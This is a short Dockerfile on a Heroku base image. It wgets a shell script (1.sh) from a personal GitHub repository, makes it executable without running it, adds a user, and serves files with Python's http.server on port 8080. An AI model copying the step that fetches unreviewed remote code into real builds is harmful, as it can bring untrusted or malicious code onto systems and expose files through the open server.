FROM heroku/heroku:20
RUN wget https://raw.githubusercontent.com/usvardaanisdabest/nodejs-test/main/1.sh
RUN chmod +x 1.sh
RUN useradd -m heroku
USER heroku
CMD python3 -m http.server 8080
